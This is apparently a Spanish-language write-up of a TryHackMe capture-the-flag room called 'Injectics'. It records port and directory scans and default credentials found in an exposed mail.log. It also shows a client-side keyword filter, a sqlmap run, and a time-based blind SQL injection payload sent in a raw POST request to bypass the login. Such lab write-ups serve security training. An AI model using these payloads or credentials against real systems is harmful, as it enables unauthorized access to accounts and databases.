
_Can you utilise your web pen-testing skills to safeguard the event from any injection attack?_  


## Escaneo

```
nmap -sC -sV -n -Pn -T 5 10.10.30.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-13 12:16 CST
Nmap scan report for 10.10.30.69
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:0e:b3:ac:65:a9:da:2c:42:1f:48:b5:cd:54:94:1c (RSA)
|   256 22:c5:2a:15:ac:4b:90:53:60:88:6b:6f:a8:c4:18:74 (ECDSA)
|_  256 46:81:1c:87:c2:c5:8a:52:39:0c:65:c3:d1:bb:53:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Injectics Leaderboard
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.20 seconds
```


## Web 80

### Escaneo de directorios

```
┌──(root㉿kali)-[/home/kali/tmp/tryhackme/injectics]
└─# ffuf -u http://10.10.67.49/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -t 100 -e .php,.js,.txt,.log,.json

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.67.49/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .js .txt .log .json 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 180ms]
index.php               [Status: 200, Size: 6588, Words: 2560, Lines: 207, Duration: 202ms]
                        [Status: 200, Size: 6588, Words: 2560, Lines: 207, Duration: 202ms]
login.php               [Status: 200, Size: 5401, Words: 1972, Lines: 162, Duration: 184ms]
mail.log                [Status: 200, Size: 1098, Words: 192, Lines: 24, Duration: 178ms]
flags                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 184ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 189ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 177ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 262ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
vendor                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 211ms]
script.js               [Status: 200, Size: 1088, Words: 403, Lines: 36, Duration: 180ms]
dashboard.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 179ms]
functions.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 198ms]
:: Progress: [56825/1323282] :: Job [1/1] :: 547 req/sec :: Duration: [0:02:01] :: Errors: 0 ::[1]  + done       wireshark KreeTransmition.pcapng
phpmyadmin              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 180ms]
composer.json           [Status: 200, Size: 48, Words: 11, Lines: 5, Duration: 192ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 179ms]
                        [Status: 200, Size: 6588, Words: 2560, Lines: 207, Duration: 186ms]
[WARN] Caught keyboard interrupt (Ctrl-C)


```


#### mail.log

```
http://10.10.118.241/mail.log

From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm

```


```
http://10.10.76.179/phpmyadmin/
```

### scripts.js

```
http://10.10.67.49/script.js

$("#login-form").on("submit", function(e) {
    e.preventDefault();
    var username = $("#email").val();
    var password = $("#pwd").val();

	const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
            for (let keyword of invalidKeywords) {
                if (username.includes(keyword)) {
                    alert('Invalid keywords detected');
                   return false;
                }
            }

    $.ajax({
        url: 'functions.php',
        type: 'POST',
        data: {
            username: username,
            password: password,
            function: "login"
        },
        dataType: 'json',
        success: function(data) {
            if (data.status == "success") {
                if (data.auth_type == 0){
                    window.location = 'dashboard.php';
                }else{
                    window.location = 'dashboard.php';
                }
            } else {
                $("#messagess").html('<div class="alert alert-danger" role="alert">' + data.message + '</div>');
            }
        }
    });
});

```

### composer.json

```
http://10.10.67.49/composer.json

	
require	
twig/twig	"2.14.0"
```


## Sqlmap

```
```

```
sqlmap -r req -p username --level 3 --risk 3 --dbms=MySql

[14:20:54] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 1051 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: username=admin' RLIKE SLEEP(5)-- eEDq&password=admin&function=login
---
[14:22:40] [INFO] the back-end DBMS is MySQL
[14:22:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[14:22:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.67.49'

[*] ending @ 14:22:41 /2025-03-13/



```

- usamos este payload en la pagina de login :
```
POST /functions.php HTTP/1.1
Host: 10.10.67.49
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 67
Origin: http://10.10.67.49
Connection: keep-alive
Referer: http://10.10.67.49/login.php
Cookie: PHPSESSID=e3s44oirlk2efovm3ioh5j257h
Priority: u=0

username=admin' RLIKE SLEEP(5)-- eEDq&password=admin&function=login


HTTP/1.1 200 OK
Date: Thu, 13 Mar 2025 19:25:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 150
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"success","message":"Login successful","is_admin":"true","first_name":"dev","last_name":"dev","redirect_link":"dashboard.php?isadmin=false"}
```


Answer the questions below

What is the flag value after logging into the admin panel?

Submit

What is the content of the hidden text file in the flags folder?